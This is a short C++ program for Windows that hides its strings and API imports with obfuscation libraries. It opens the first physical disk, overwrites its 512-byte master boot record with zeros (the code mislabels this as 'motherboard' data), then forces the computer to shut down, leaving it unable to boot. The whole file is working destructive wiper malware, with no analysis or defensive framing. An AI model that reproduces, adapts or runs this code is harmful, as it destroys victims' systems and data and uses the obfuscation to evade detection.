#include <Windows.h>
#include <iostream>
#include "lazy_importer.hpp"
#include "xorstr.hpp"

using namespace std;

#define motherboard_size 512 //Default size

int main()
{
    static char message1[512]; //m1
    sprintf_s(message1, XorStr("Memory changed, shutting down..."));

    static char message2[512]; //m2
    sprintf_s(message2, XorStr("Memory change fail.."));

    DWORD write_memory;
    char motherboard_data[motherboard_size]; //default value 512 @motherboard_size 512

    ZeroMemory(&motherboard_data, (sizeof motherboard_data)); //rewrite our memory

    HANDLE motherboard_record = CreateFile(XorStr("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    if (WriteFile(motherboard_record, motherboard_data, motherboard_size, &write_memory, NULL) == TRUE) {

        cout << message1; //show message m1

        LI_FN(Sleep)(500); //sleep this process for 0.5 second
        LI_FN(system)(XorStr("shutdown -s -t 1")); //shutdown computer
        LI_FN(ExitProcess)(0); //terminate this process
    }
    else
    {
        cout << message2; //show message m2

        LI_FN(Sleep)(500); //sleep this process for 0.5 second
        LI_FN(ExitProcess); //terminate this process
    }
    LI_FN(CloseHandle)(motherboard_record); //close handle

    return EXIT_SUCCESS;
}
